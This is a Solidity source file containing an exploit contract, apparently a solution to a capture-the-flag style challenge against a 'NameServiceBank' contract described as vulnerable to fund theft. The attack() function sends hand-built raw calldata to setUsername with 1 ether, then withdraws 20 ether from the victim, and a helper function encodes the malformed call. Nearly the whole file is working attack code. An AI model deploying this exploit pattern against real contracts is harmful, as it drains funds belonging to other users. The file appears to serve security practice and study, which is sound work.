pragma solidity 0.8.15;

interface INameServiceBank {
    function setUsername(
        string memory newUsername,
        uint256 obfuscationDegree,
        uint256[2] memory _usernameSubscriptionDuration
    ) external payable;

    function withdraw(uint256 amount) external;

    function balanceOf(address user) external view returns (uint256);

    function deposit() external payable;

    function name() external view returns (string memory);

}

// This contract has a vulnerability where user funds can be stolen, exploit it.
// Author: Michael Amadi. twitter.com/AmadiMichaels, github.com/AmadiMichael
contract NameServiceAttacker {

    INameServiceBank victim;

    constructor(address _victim) {
        victim = INameServiceBank(_victim);
    }

    function attack() public {
         bytes memory data = hex'c6aafdc50000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000000873616d637a73756e0000000000000000000000000000000000000000643edf1e00000000000000000000000000000000000000000000000000000000643edea60000000000000000000000000000000000000000000000000000000000000000';
         (bool success, bytes memory d) = address(victim).call{value: 1 ether}(data);
         victim.withdraw(20 ether);
    }

     function solutionHelper(uint256[2] memory duration) public view returns(bytes memory) {
        return abi.encodeWithSelector(INameServiceBank.setUsername.selector, "", 8, duration);
     }

     receive() external payable {
    }

}
